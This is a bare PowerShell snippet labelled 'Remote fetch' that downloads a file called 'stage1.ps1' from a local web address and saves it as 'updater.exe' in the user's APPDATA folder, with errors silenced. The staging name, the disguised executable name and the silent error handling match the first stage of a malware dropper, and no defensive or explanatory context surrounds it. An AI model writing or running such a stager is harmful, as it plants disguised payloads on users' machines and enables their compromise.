
<# Remote fetch #> $RemoteUrl = "https://localhost:8080/stage1.ps1"; $WorkingPath = "$env:APPDATA\updater.exe"; Start-BitsTransfer -Source $RemoteUrl -Destination $WorkingPath -ErrorAction SilentlyContinue; Set-Location -Path $env:TEMP
